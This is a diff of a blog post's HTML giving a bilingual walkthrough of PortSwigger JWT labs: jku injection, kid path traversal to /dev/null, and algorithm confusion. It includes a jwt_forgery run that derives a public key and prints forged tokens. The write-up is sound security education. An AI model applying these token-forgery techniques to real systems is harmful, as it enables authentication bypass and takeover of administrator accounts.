+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;kty&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RSA&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;e&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AQAB&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;75d0ef47-af89-47a9-9061-7c02a610d5ab&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;n&quot;</span><span class="punctuation">:</span> <span class="string">&quot;o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;kty&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RSA&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;e&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AQAB&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;n&quot;</span><span class="punctuation">:</span> <span class="string">&quot;fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
 </blockquote>
 <p>JWK Sets like this are sometimes exposed publicly via a standard endpoint, such as <code>/.well-known/jwks.json</code>.</p>
 <p>More secure websites will only fetch keys from trusted domains, but you can sometimes take advantage of URL parsing discrepancies to bypass this kind of filtering. </p>
@@ -267,29 +441,24 @@
 <p>具体步骤与Lab 4差不多，先将自己生成的公钥以JWT的形式复制下来，并保存至json文件，再使用某个url定位此json文件，然后将url插入header中的<code>jku</code>，修改<code>sub</code>为administrator，最后再使用自己的私钥对header和payload签名即可。</p>
 <p>关键步骤如下：</p>
 <p>将公钥以JWK的形式上传至服务器。</p>
-<p><img src="/../img/JWT-attacks/5-1.png" alt="5-1"></p>
+<p><a href="/../img/JWT-attacks/5-1.png" title="5-1" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/5-1.png" alt="5-1"></a></p>
 <p>修改header(加上<code>jku</code>)、payload(修改<code>sub</code>)，最后用对应的私钥签名即可完成JWT的伪造。最后发送数据包访问&#x2F;admin即可。</p>
-<p><img src="/../img/JWT-attacks/5-2.png" alt="5-2"></p>
+<p><a href="/../img/JWT-attacks/5-2.png" title="5-2" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/5-2.png" alt="5-2"></a></p>
 <p>成功访问到&#x2F;admin页面，将carlos删除即可完成实验。</p>
 <p>附：但是在做的时候出现了一个问题，刚开始我把JWK部署在Github的静态个人博客上，但是这样一直没有成功，返回的数据都是401 Unauthorized。</p>
 <p>但是使用Port Swigger自带的服务器就可以….</p>
 <p>Github返回的返回内容：</p>
-<p><img src="/../img/JWT-attacks/5-3.png" alt="5-3"></p>
+<p><a href="/../img/JWT-attacks/5-3.png" title="5-3" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/5-3.png" alt="5-3"></a></p>
 <p>Port Swigger自带服务器返回的内容：</p>
-<p><img src="/../img/JWT-attacks/5-4.png" alt="5-4"></p>
+<p><a href="/../img/JWT-attacks/5-4.png" title="5-4" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/5-4.png" alt="5-4"></a></p>
 <p>他们的Response内容都一样…..但是用Github的url就会失败，可能是因为Port Swigger下载下来的是html文件，而且内容为：</p>
-<p><img src="/../img/JWT-attacks/5-5.png" alt="5-5"></p>
+<p><a href="/../img/JWT-attacks/5-5.png" title="5-5" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/5-5.png" alt="5-5"></a></p>
 <p>而我的github部署的是json文件。</p>
 <h4 id="Injecting-self-signed-JWTs-via-the-kid-parameter"><a href="#Injecting-self-signed-JWTs-via-the-kid-parameter" class="headerlink" title="Injecting self-signed JWTs via the kid parameter"></a>Injecting self-signed JWTs via the kid parameter</h4><p>Servers may use several cryptographic keys for signing different kinds of data, not just JWTs. For this reason, the header of a JWT may contain a <code>kid</code> (Key ID) parameter, which helps the server identify which key to use when verifying the signature.</p>
 <p>Verification keys are often stored as a JWK Set. In this case, the server may simply look for the JWK with the same <code>kid</code> as the token. However, the JWS specification doesn’t define a concrete structure for this ID - it’s just an arbitrary string of the developer’s choosing. For example, they might use the <code>kid</code> parameter to point to a particular entry in a database, or even the name of a file.</p>
 <p>If this parameter is also vulnerable to <strong>directory traversal</strong>, an attacker could potentially force the server to use an arbitrary file from its filesystem as the verification key.</p>
-<pre><code class="json">&#123;
-    &quot;kid&quot;: &quot;../../path/to/file&quot;,
-    &quot;typ&quot;: &quot;JWT&quot;,
-    &quot;alg&quot;: &quot;HS256&quot;,
-    &quot;k&quot;: &quot;asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc&quot;
-&#125;
-</code></pre>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../path/to/file&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;k&quot;</span><span class="punctuation">:</span> <span class="string">&quot;asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
 <p>This is especially dangerous if the server also supports JWTs signed using a symmetric algorithm. In this case, an attacker could potentially point the <code>kid</code> parameter to a predictable, static file, then sign the JWT using a secret that matches the contents of this file.</p>
 <p>You could theoretically do this with any file, but one of the simplest methods is to use <code>/dev/null</code>, which is present on most Linux systems. As this is an empty file, reading it returns an empty string. Therefore, signing the token with a empty string will result in a valid signature.</p>
 <hr>
@@ -305,10 +474,10 @@
 <p>通过抓包发现服务器的验证程序使用的是对称密码算法HS256。于是我们尝试对<code>kid</code>进行修改，让服务器用空字符串进行验证，然后我们也用空字符串签名，这样就可以达到伪造JWT的效果了。</p>
 <p>在linux系统中，<code>/</code> (根目录)：整个文件系统的起始点，所有其他目录都是在根目录下的子目录，dev文件夹就在根目录下。</p>
 <p>显然，kid是相对路径，如果直接将<code>kid</code>设为<code>/dev/null</code>，服务器会从当前目录下寻找，当然会失败。这时就必须先一步一步回退上一级目录，使用<code>../</code>，回退到根目录（即使回退到了根目录，再退也还是根目录），从才能正确进入dev文件夹读取null。经过我的测试，回退三次即可成功读取到null。</p>
-<p><img src="/../img/JWT-attacks/6-1.png" alt="6-1"></p>
+<p><a href="/../img/JWT-attacks/6-1.png" title="6-1" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/6-1.png" alt="6-1"></a></p>
 <p>服务器实际上从 <code>/dev/null</code> 读取的字符串就是 <code>00</code> 的十六进制表示。这是因为 <code>/dev/null</code> 是一个特殊设备，读取时返回的是一个空字符，其 ASCII 码值为 0（一个ASCII码字符对应一个字节），对应的十六进制表示就是 <code>00</code>。那么服务器就会将十六进制的<code>00</code>作为对称密钥对签名进行验证。</p>
 <p>然后在Burp Suite中新生成一个对称密钥，生成后将”k”改为”AA&#x3D;&#x3D;”：</p>
-<p><img src="/../img/JWT-attacks/6-2.png" alt="6-2"></p>
+<p><a href="/../img/JWT-attacks/6-2.png" title="6-2" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/6-2.png" alt="6-2"></a></p>
 <p>为什么K要改为<code>AA==</code>？</p>
 <p>因为JWT的key需要进过base64编码，而Base64 编码是将二进制数据按照每 3 个字节为一组进行处理，并转换为四个可打印字符组成的字符串。具体过程如下：</p>
 <ol>
@@ -323,9 +492,9 @@
 </ul>
 <p>对于十六进制的<code>00</code>来说，它被看作是一个具有 8 位的二进制数 <code>00000000</code>，先将 <code>00000000</code> 拆分为两个 6 位的值：<code>000000</code> 和 <code>00</code>；然后将这两个 6 位的值映射到 Base64 字符表中：<code>000000</code> 对应字符 <code>A</code>，<code>00</code> 对应字符 <code>A</code>；最后，添加 Base64 的 padding 字符 <code>=</code>，得到的编码结果是：<code>AA==</code>。</p>
 <p>然后再使用修改过后的对称密钥对伪造的header和payload进行加密：</p>
-<p><img src="/../img/JWT-attacks/6-3.png" alt="6-3"></p>
+<p><a href="/../img/JWT-attacks/6-3.png" title="6-3" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/6-3.png" alt="6-3"></a></p>
 <p>至此就完成了JWT的伪造，现在可以成功以administrator的身份登录&#x2F;admin界面了。</p>
-<p><img src="/../img/JWT-attacks/6-4.png" alt="6-4"></p>
+<p><a href="/../img/JWT-attacks/6-4.png" title="6-4" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/6-4.png" alt="6-4"></a></p>
 <p>最后删除carlos用户完成实验。</p>
 <h4 id="Other-interesting-JWT-header-parameters"><a href="#Other-interesting-JWT-header-parameters" class="headerlink" title="Other interesting JWT header parameters"></a>Other interesting JWT header parameters</h4><p>The following header parameters may also be interesting for attackers:</p>
 <ul>
@@ -337,20 +506,11 @@
 <p><strong>How do algorithm confusion vulnerabilities arise?</strong></p>
 <p>Algorithm confusion vulnerabilities typically arise due to flawed implementation of JWT libraries. Although the actual verification process differs depending on the algorithm used, many libraries provide a single, algorithm-agnostic method for verifying signatures. These methods rely on the <code>alg</code> parameter in the token’s header to determine the type of verification they should perform.</p>
 <p>The following pseudo-code shows a simplified example of what the declaration for this generic <code>verify()</code> method might look like in a JWT library:</p>
-<pre><code>function verify(token, secretOrPublicKey)&#123;
-    algorithm = token.getAlgHeader();
-    if(algorithm == &quot;RS256&quot;)&#123;
-        // Use the provided key as an RSA public key
-    &#125; else if (algorithm == &quot;HS256&quot;)&#123;
-        // Use the provided key as an HMAC secret key
-    &#125;
-&#125;
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function verify(token, secretOrPublicKey)&#123;</span><br><span class="line">    algorithm = token.getAlgHeader();</span><br><span class="line">    if(algorithm == &quot;RS256&quot;)&#123;</span><br><span class="line">        // Use the provided key as an RSA public key</span><br><span class="line">    &#125; else if (algorithm == &quot;HS256&quot;)&#123;</span><br><span class="line">        // Use the provided key as an HMAC secret key</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>Problems arise when website developers who subsequently use this method assume that it will exclusively handle JWTs signed using an asymmetric algorithm like RS256. Due to this flawed assumption, they may always pass a fixed public key to the method as follows:</p>
-<pre><code>publicKey = &lt;public-key-of-server&gt;;
-token = request.getCookie(&quot;session&quot;);
-verify(token, publicKey);
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">publicKey = &lt;public-key-of-server&gt;;</span><br><span class="line">token = request.getCookie(&quot;session&quot;);</span><br><span class="line">verify(token, publicKey);</span><br></pre></td></tr></table></figure>
+
 <p>In this case, if the server receives a token signed using a symmetric algorithm like HS256, the library’s generic <code>verify()</code> method will treat the public key as an HMAC secret. This means that an attacker could sign the token using HS256 and the public key, and the server will use the same public key to verify the signature.</p>
 <p>简单地说，算法混淆攻击的前提是：</p>
 <ol>
@@ -367,66 +527,36 @@ verify(token, publicKey);
 <p>登陆已知的账号之后，抓取数据包分析JWT发现该服务器使用的是RS256验证算法，即使用私钥签名，公钥验证。要成功伪造JWT，就要先获得服务器的公钥。</p>
 <p>服务器有时会通过映射到 &#x2F;jwks.json 或 &#x2F;.well-known&#x2F;jwks.json 的标准端点将其公钥公开为 JWK对象。即使公钥没有被公开，但是我们也可以从一对JWT中进行提取（Lab 8的内容）。</p>
 <p>在本次实验中公钥映射到了&#x2F;jwks.json</p>
-<p><img src="/../img/JWT-attacks/7-1.png" alt="7-1"></p>
+<p><a href="/../img/JWT-attacks/7-1.png" title="7-1" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/7-1.png" alt="7-1"></a></p>
 <p>我们将JWK Set中的公钥复制到Burp Suite中，生成一个RSA公钥对象。</p>
-<p><img src="/../img/JWT-attacks/7-2.png" alt="7-2"></p>
+<p><a href="/../img/JWT-attacks/7-2.png" title="7-2" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/7-2.png" alt="7-2"></a></p>
 <p><strong>第二步：将公钥作为对称加密算法的密钥</strong></p>
 <p>然后我们将其转换为PEM格式，然后将公钥PEM格式的内容全部进行Base64编码。</p>
-<p><img src="/../img/JWT-attacks/7-3.png" alt="7-3"></p>
+<p><a href="/../img/JWT-attacks/7-3.png" title="7-3" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/7-3.png" alt="7-3"></a></p>
 <p>再随便生成一个对称加密算法的密钥，然后将上面Base64编码的结果复制到刚生成的密钥的K参数上。</p>
-<p><img src="/../img/JWT-attacks/7-4.png" alt="7-4"></p>
+<p><a href="/../img/JWT-attacks/7-4.png" title="7-4" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/7-4.png" alt="7-4"></a></p>
 <p><strong>第三步：修改header，和payload</strong></p>
-<p><img src="/../img/JWT-attacks/7-5.png" alt="7-5"></p>
+<p><a href="/../img/JWT-attacks/7-5.png" title="7-5" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/7-5.png" alt="7-5"></a></p>
 <p>注意，kid不要改，kid本身就与服务器上的公钥的kid一致。</p>
 <p><strong>第四步：用对称加密算法密钥签名，并发送请求</strong></p>
-<p>点击Sign按钮，使用刚刚创建的对称加密算法的密钥，使用HS256算法进行签名，然后点击Send发送请求，即可进入&#x2F;admin管理员页面，删除carlos用户完成实验。<img src="/../img/JWT-attacks/7-6.png" alt="7-6"></p>
+<p>点击Sign按钮，使用刚刚创建的对称加密算法的密钥，使用HS256算法进行签名，然后点击Send发送请求，即可进入&#x2F;admin管理员页面，删除carlos用户完成实验。<a href="/../img/JWT-attacks/7-6.png" title="7-6" class="gallery-item" style="box-shadow: none;"> <img src="/../img/JWT-attacks/7-6.png" alt="7-6"></a></p>
 <hr>
 <p>但如果，服务器并没有把public key公开呢？</p>
 <p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key"><strong>Lab 8: JWT authentication bypass via algorithm confusion with no exposed key</strong></a></p>
 <p>可以使用工具<a target="_blank" rel="noopener" href="https://github.com/silentsignal/rsa_sign2n">jwt_forger</a>，他会使用我们提供的 JWT 来计算 n 的一个或多个潜在值。其中只有一个与服务器密钥使用的 n 值匹配，该程序就会将其保存为x509格式或者pkcs1格式的pem文件。这样就可以获得服务器的公钥，实施算法混淆攻击。</p>
-<pre><code class="bash">jwt_forgery &lt;token1&gt; &lt;token2&gt;
-</code></pre>
-<p>jwt_forger命令行实际运行效果：</p>
-<pre><code class="bash">root@ecdfab3005f4:/app# python3 jwt_forgery.py eyJraWQiOiIzZjRhZjRiMS1mY2M1LTQwZjUtODM4My02NGRmZjI3NGE0NDUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY5MTE0MTQwMn0.Bl2KswJWpEeSRhAb03UiXq9-4a_Powo-bLTj1HD2nlEeu8uDGp2NhPeLRnMwq4hFtj8lW811nymxU3Q--Fig5hbuJhUh1wolTfir7CattvAmTRC-i88URUs-oIH6BvMYbbD0dNMhNt-9uaamJ413vh9GH6glojM1ph_Bg6awqLntoioyv_PV6VSA12x6NHKNMq-0bs2GAxOCBoHvFFuq5hBU5HYfCg8ExdXbewwqJjLRqnkwyjJ6lKf24iVbe7uiYrSH1wUQZl2_Q7Fu0ly7houPCBIkuJbAs0-YrAIvjKfNPKPZszXFceZysFYdi4u0oA0o-lbTcwnpm_juoYWvhw eyJraWQiOiIzZjRhZjRiMS1mY2M1LTQwZjUtODM4My02NGRmZjI3NGE0NDUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY5MTE0MTY2Mn0.CPrJ7dQEg-rVuHNrtHdHJfiUkxwnT7UmY8B_NMqlS2RutXG9BGtkHy-pMc9QS7twcUnw9zv0Hfvf49bAcUb7wFgQ53SPB9r5OsuRw0BwPuxJVheoGCSbvdeW6tD8PivV5yqDEJOnkaYuxFYeaeIs85YxusgRj_OnKlWvhROICAE7kYe7RnLzrYX3_WiU-bIWT-WMEWcr1FwK2RF7DWb48DF0W-gETdl-n2AYiEsa2VbSHnt2vH4gvBVjNPxLr7IuTEYHr7H-S2YDN4-0p6TBcKnkoaJzTYSt1XWnsYbnyjq0kmzEDaToaA7cPGkNvWAmZzD_NBNm2mQry_S4VknKzA
-[*] GCD:  0x1
-[*] GCD:  0x9eabc94b42906dfbd53b8c8ed075991090638c92214b85f5369da0b809359a60eb12004bd425e8f75e1a9c43dd0770ef488d3d8eaf08620dd9b3766ac31b36987844086c14c2dcf1c8ab91f5450ab201110078cf22c70d8dbe25bd095a947e34307490905470b4f9564548fb8fc0c332002c357e81537e97a7a1053e819eaa2a7b77885b89ec9126ed4e3c7c761f632b195b3faa9e0ce381f1ee5302f7020b51155937554977fc77d6d11b27d5f5d3f8d5c66daa4a4850f196bac4215f93cef55d1b28616f82ed1f27b16b94d0e87fa9f630d291a97f1e9f22eda282e27cf71a6e573813ebda43e4ed7ac635dd04750418816237e43b35c83f6498f3385e0f99
-[+] Found n with multiplier 1  :
- 0x9eabc94b42906dfbd53b8c8ed075991090638c92214b85f5369da0b809359a60eb12004bd425e8f75e1a9c43dd0770ef488d3d8eaf08620dd9b3766ac31b36987844086c14c2dcf1c8ab91f5450ab201110078cf22c70d8dbe25bd095a947e34307490905470b4f9564548fb8fc0c332002c357e81537e97a7a1053e819eaa2a7b77885b89ec9126ed4e3c7c761f632b195b3faa9e0ce381f1ee5302f7020b51155937554977fc77d6d11b27d5f5d3f8d5c66daa4a4850f196bac4215f93cef55d1b28616f82ed1f27b16b94d0e87fa9f630d291a97f1e9f22eda282e27cf71a6e573813ebda43e4ed7ac635dd04750418816237e43b35c83f6498f3385e0f99
-[+] Written to 9eabc94b42906dfb_65537_x509.pem
-[+] Tampered JWT: b&#39;eyJraWQiOiIzZjRhZjRiMS1mY2M1LTQwZjUtODM4My02NGRmZjI3NGE0NDUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjkxMjI0NjQ3fQ.AYG4nDBhtzoWcU685taZmRQqML7GaZrFtLzgMOBTjiE&#39;
-[+] Written to 9eabc94b42906dfb_65537_pkcs1.pem
-[+] Tampered JWT: b&#39;eyJraWQiOiIzZjRhZjRiMS1mY2M1LTQwZjUtODM4My02NGRmZjI3NGE0NDUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjkxMjI0NjQ3fQ.F0iHCARSbO2x5TXcMaPb8BgWa-V6oTwZcTbfAFHSaEA&#39;
-================================================================================
-Here are your JWT&#39;s once again for your copypasting pleasure
-================================================================================
-eyJraWQiOiIzZjRhZjRiMS1mY2M1LTQwZjUtODM4My02NGRmZjI3NGE0NDUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjkxMjI0NjQ3fQ.AYG4nDBhtzoWcU685taZmRQqML7GaZrFtLzgMOBTjiE
-eyJraWQiOiIzZjRhZjRiMS1mY2M1LTQwZjUtODM4My02NGRmZjI3NGE0NDUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjkxMjI0NjQ3fQ.F0iHCARSbO2x5TXcMaPb8BgWa-V6oTwZcTbfAFHSaEA
-root@ecdfab3005f4:/app# dir
-9eabc94b42906dfb_65537_pkcs1.pem  Dockerfile  jwt_forgery.py  requirements.txt
-9eabc94b42906dfb_65537_x509.pem   README.md   pkcs1.asn       x509.asn
-root@ecdfab3005f4:/app# cat 9eabc94b42906dfb_65537_x509.pem
------BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnqvJS0KQbfvVO4yO0HWZ
-EJBjjJIhS4X1Np2guAk1mmDrEgBL1CXo914anEPdB3DvSI09jq8IYg3Zs3Zqwxs2
-mHhECGwUwtzxyKuR9UUKsgERAHjPIscNjb4lvQlalH40MHSQkFRwtPlWRUj7j8DD
-MgAsNX6BU36Xp6EFPoGeqip7d4hbieyRJu1OPHx2H2MrGVs/qp4M44Hx7lMC9wIL
-URVZN1VJd/x31tEbJ9X10/jVxm2qSkhQ8Za6xCFfk871XRsoYW+C7R8nsWuU0Oh/
-qfYw0pGpfx6fIu2iguJ89xpuVzgT69pD5O16xjXdBHUEGIFiN+Q7Ncg/ZJjzOF4P
-mQIDAQAB
------END PUBLIC KEY-----
-root@ecdfab3005f4:/app# cat 9eabc94b42906dfb_65537_pkcs1.pem
------BEGIN RSA PUBLIC KEY-----
-MIIBCgKCAQEAnqvJS0KQbfvVO4yO0HWZEJBjjJIhS4X1Np2guAk1mmDrEgBL1CXo
-914anEPdB3DvSI09jq8IYg3Zs3Zqwxs2mHhECGwUwtzxyKuR9UUKsgERAHjPIscN
-jb4lvQlalH40MHSQkFRwtPlWRUj7j8DDMgAsNX6BU36Xp6EFPoGeqip7d4hbieyR
-Ju1OPHx2H2MrGVs/qp4M44Hx7lMC9wILURVZN1VJd/x31tEbJ9X10/jVxm2qSkhQ
-8Za6xCFfk871XRsoYW+C7R8nsWuU0Oh/qfYw0pGpfx6fIu2iguJ89xpuVzgT69pD
-5O16xjXdBHUEGIFiN+Q7Ncg/ZJjzOF4PmQIDAQAB
------END RSA PUBLIC KEY-----
-</code></pre>
-<p>可以看出jwt_forger已经把公钥分为两个格式存入文件了，分别使用两个形式的公钥进行尝试就可以了。最后使用x509格式的公钥成功完成了实验。</p>
-<p><img src="/../img/JWT-attacks/8-1.png" alt="8-1"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jwt_forgery &lt;token1&gt; &lt;token2&gt;</span><br></pre></td></tr></table></figure>
 
+<p>jwt_forger命令行实际运行效果：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root@ecdfab3005f4:/app<span class="comment"># python3 jwt_forgery.py eyJraWQiOiIzZjRhZjRiMS1mY2M1LTQwZjUtODM4My02NGRmZjI3NGE0NDUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY5MTE0MTQwMn0.Bl2KswJWpEeSRhAb03UiXq9-4a_Powo-bLTj1HD2nlEeu8uDGp2NhPeLRnMwq4hFtj8lW811nymxU3Q--Fig5hbuJhUh1wolTfir7CattvAmTRC-i88URUs-oIH6BvMYbbD0dNMhNt-9uaamJ413vh9GH6glojM1ph_Bg6awqLntoioyv_PV6VSA12x6NHKNMq-0bs2GAxOCBoHvFFuq5hBU5HYfCg8ExdXbewwqJjLRqnkwyjJ6lKf24iVbe7uiYrSH1wUQZl2_Q7Fu0ly7houPCBIkuJbAs0-YrAIvjKfNPKPZszXFceZysFYdi4u0oA0o-lbTcwnpm_juoYWvhw eyJraWQiOiIzZjRhZjRiMS1mY2M1LTQwZjUtODM4My02NGRmZjI3NGE0NDUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY5MTE0MTY2Mn0.CPrJ7dQEg-rVuHNrtHdHJfiUkxwnT7UmY8B_NMqlS2RutXG9BGtkHy-pMc9QS7twcUnw9zv0Hfvf49bAcUb7wFgQ53SPB9r5OsuRw0BwPuxJVheoGCSbvdeW6tD8PivV5yqDEJOnkaYuxFYeaeIs85YxusgRj_OnKlWvhROICAE7kYe7RnLzrYX3_WiU-bIWT-WMEWcr1FwK2RF7DWb48DF0W-gETdl-n2AYiEsa2VbSHnt2vH4gvBVjNPxLr7IuTEYHr7H-S2YDN4-0p6TBcKnkoaJzTYSt1XWnsYbnyjq0kmzEDaToaA7cPGkNvWAmZzD_NBNm2mQry_S4VknKzA</span></span><br><span class="line">[*] GCD:  0x1</span><br><span class="line">[*] GCD:  0x9eabc94b42906dfbd53b8c8ed075991090638c92214b85f5369da0b809359a60eb12004bd425e8f75e1a9c43dd0770ef488d3d8eaf08620dd9b3766ac31b36987844086c14c2dcf1c8ab91f5450ab201110078cf22c70d8dbe25bd095a947e34307490905470b4f9564548fb8fc0c332002c357e81537e97a7a1053e819eaa2a7b77885b89ec9126ed4e3c7c761f632b195b3faa9e0ce381f1ee5302f7020b51155937554977fc77d6d11b27d5f5d3f8d5c66daa4a4850f196bac4215f93cef55d1b28616f82ed1f27b16b94d0e87fa9f630d291a97f1e9f22eda282e27cf71a6e573813ebda43e4ed7ac635dd04750418816237e43b35c83f6498f3385e0f99</span><br><span class="line">[+] Found n with multiplier 1  :</span><br><span class="line"> 0x9eabc94b42906dfbd53b8c8ed075991090638c92214b85f5369da0b809359a60eb12004bd425e8f75e1a9c43dd0770ef488d3d8eaf08620dd9b3766ac31b36987844086c14c2dcf1c8ab91f5450ab201110078cf22c70d8dbe25bd095a947e34307490905470b4f9564548fb8fc0c332002c357e81537e97a7a1053e819eaa2a7b77885b89ec9126ed4e3c7c761f632b195b3faa9e0ce381f1ee5302f7020b51155937554977fc77d6d11b27d5f5d3f8d5c66daa4a4850f196bac4215f93cef55d1b28616f82ed1f27b16b94d0e87fa9f630d291a97f1e9f22eda282e27cf71a6e573813ebda43e4ed7ac635dd04750418816237e43b35c83f6498f3385e0f99</span><br><span class="line">[+] Written to 9eabc94b42906dfb_65537_x509.pem</span><br><span class="line">[+] Tampered JWT: b<span class="string">&#x27;eyJraWQiOiIzZjRhZjRiMS1mY2M1LTQwZjUtODM4My02NGRmZjI3NGE0NDUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjkxMjI0NjQ3fQ.AYG4nDBhtzoWcU685taZmRQqML7GaZrFtLzgMOBTjiE&#x27;</span></span><br><span class="line">[+] Written to 9eabc94b42906dfb_65537_pkcs1.pem</span><br><span class="line">[+] Tampered JWT: b<span 